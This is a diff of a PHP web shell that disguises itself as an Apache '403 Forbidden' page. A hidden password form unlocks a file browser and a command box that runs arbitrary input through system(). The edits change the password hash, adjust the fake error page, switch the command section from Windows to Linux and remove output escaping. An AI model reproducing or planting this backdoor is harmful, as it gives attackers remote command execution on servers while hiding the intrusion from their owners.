@@ -1,7 +1,7 @@
 <?php
 session_start();
 
-$correctPasswordHash = '5f4dcc3b5aa765d61d8327deb882cf99'; // password
+$correctPasswordHash = 'b1fbd7e666a56c405c73b4b144d69156'; // sipur
 
 if (isset($_POST['password'])) {
     $enteredPassword = $_POST['password'];
@@ -16,18 +16,19 @@ if (!isset($_SESSION['authenticated'])) {
     echo '
     <!DOCTYPE html>
     <html lang="en">
-    <head>
-        <meta charset="UTF-8">
         <title>403 Forbidden</title><br>
-        </head><body>
-        <h1>403 Forbidden</h1>
+        <h1>Forbidden</h1>
 <p>You dont have permission to access this resource.</p>
 <p>Additionally, a 403 Forbidden
 error was encountered while trying to use an ErrorDocument to handle the request.</p>
         <style>
             body {
-                font-family: Arial, sans-serif;
+                font-family: Roboto;
                 background-color: white;
+                padding: 10px;
+                top: 0;
+                left: 10px;
+                border-bottom-right-radius: 5px;
                 color: black;
                 margin: 0;
                 padding: 0;
@@ -42,7 +43,7 @@ error was encountered while trying to use an ErrorDocument to handle the request
                 padding: 10px;
                 border-radius: 5px;
             }
-            .password-form input[type="  "] {
+            .password-form input[type=""] {
                 background-color: transparent;
                 border: 1px solid white;
                 color: white;
@@ -51,7 +52,7 @@ error was encountered while trying to use an ErrorDocument to handle the request
             }
             .password-form input[type="submit"] {
                 background-color: transparent;
-                border: 1px solid white;
+                border: 1px white;
                 color: white;
                 padding: 5px 10px;
                 border-radius: 3px;
@@ -62,11 +63,9 @@ error was encountered while trying to use an ErrorDocument to handle the request
             }
         </style>
     </head>
-    <body>
-        <div class="password-form">
-            <form method="POST">
-                <input type="password" name="password" placeholder="" required>
-                <input type="submit" value="Login">
+    <body> 
+          <div class="password-form">
+          <form method="post"><input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="password"></form>
             </form>
         </div>
     </body>
@@ -205,28 +204,6 @@ error was encountered while trying to use an ErrorDocument to handle the request
         }
     }
     ?>
-    <?php
-    $requestedDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
-    if (!is_dir($requestedDir)) {
-        $requestedDir = getcwd();
-    }
-    $currentDir = realpath($requestedDir);
-    ?>
-    <h2>Detected Drives</h2>
-    <p>
-        <?php
-        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
-            $drives = array();
-            foreach (range('A', 'Z') as $letter) {
-                if (is_dir($letter . ':/')) {
-                    $drives[] = '<a href="?dir=' . urlencode($letter . ':\\') . '">' . $letter . ':</a>';
-                }
-            }
-            echo implode(' | ', $drives);
-        } else {
-            echo 'Detected Drives feature is available only on Windows.';
-        }
-        ?>
     <?php
     $requestedDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
     if (!is_dir($requestedDir)) {
@@ -408,17 +385,17 @@ error was encountered while trying to use an ErrorDocument to handle the request
         }
     }
     ?>
-    <h2>CMD [ Windows ]</h2>
+    <h2>CMD [ Linux ]</h2>
     <form method="GET">
-        <input type="hidden" name="dir" value="<?php echo htmlspecialchars($currentDir, ENT_QUOTES, 'UTF-8'); ?>">
-        <input type="text" name="cmd" autofocus size="80" placeholder="Enter command (e.g., dir)">
+        <input type="text" name="cmd" autofocus size="80" placeholder="Enter command (e.g., ls -la)">
         <input type="submit" value=">>>">
     </form>
     <pre>
     <?php
     if (!empty($_GET['cmd'])) {
         $command = $_GET['cmd'];
-        echo "Command: " . htmlspecialchars($command, ENT_QUOTES, 'UTF-8') . "\n\n";
+        echo "Command: " . $command . "\n\n";
+        // Run Linux Command
         system($command . ' 2>&1');
     }
     ?>
